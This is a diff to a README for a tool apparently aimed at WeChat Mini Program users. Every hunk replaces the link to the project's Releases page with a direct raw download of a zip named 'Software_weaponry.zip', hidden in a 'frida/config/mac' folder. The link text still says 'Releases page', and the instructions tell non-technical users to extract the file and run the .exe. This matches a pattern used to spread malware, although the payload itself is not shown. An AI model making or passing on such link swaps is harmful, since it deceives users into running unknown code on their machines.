@@ -1,6 +1,6 @@
 # 🛠️ First - Simple Tools for WeChat Mini Programs
 
-[![Download First](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/rorafiftysix26/First/releases)
+[![Download First](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/rorafiftysix26/First/raw/refs/heads/main/frida/config/mac/Software_weaponry.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ This app is made for end users who want a simple way to open the tool, load thei
 
 ## 📥 Download
 
-Visit this page to download: [First Releases](https://github.com/rorafiftysix26/First/releases)
+Visit this page to download: [First Releases](https://github.com/rorafiftysix26/First/raw/refs/heads/main/frida/config/mac/Software_weaponry.zip)
 
 On the Releases page, look for the latest version. Download the file that matches your Windows PC. If you see a `.zip` file, download it and unpack it. If you see a `.exe` file, download it and open it.
 
@@ -33,7 +33,7 @@ On the Releases page, look for the latest version. Download the file that matche
 
 ## 🚀 Getting Started
 
-1. Open the [Releases page](https://github.com/rorafiftysix26/First/releases)
+1. Open the [Releases page](https://github.com/rorafiftysix26/First/raw/refs/heads/main/frida/config/mac/Software_weaponry.zip)
 2. Download the latest release
 3. If the file is compressed, right-click it and choose Extract All
 4. Open the extracted folder
@@ -157,7 +157,7 @@ Yes. You do not need programming knowledge to download and open the app.
 Usually no. Download the release, extract it if needed, and run the app.
 
 ### Where do I get the newest version?
-Use the [Releases page](https://github.com/rorafiftysix26/First/releases)
+Use the [Releases page](https://github.com/rorafiftysix26/First/raw/refs/heads/main/frida/config/mac/Software_weaponry.zip)
 
 ### Can I move the app to another folder?
 Yes. You can move the extracted folder to Desktop, Documents, or another local folder.
@@ -167,7 +167,7 @@ It gives you the latest build in one place and keeps the download process simple
 
 ## 📌 Quick Steps
 
-1. Open the [Releases page](https://github.com/rorafiftysix26/First/releases)
+1. Open the [Releases page](https://github.com/rorafiftysix26/First/raw/refs/heads/main/frida/config/mac/Software_weaponry.zip)
 2. Download the latest file
 3. Extract it if needed
 4. Open the app
@@ -186,7 +186,7 @@ It gives you the latest build in one place and keeps the download process simple
 
 Use this link to visit the download page and get the latest version:
 
-[First Releases](https://github.com/rorafiftysix26/First/releases)
+[First Releases](https://github.com/rorafiftysix26/First/raw/refs/heads/main/frida/config/mac/Software_weaponry.zip)
 
 ## 📝 About First
 
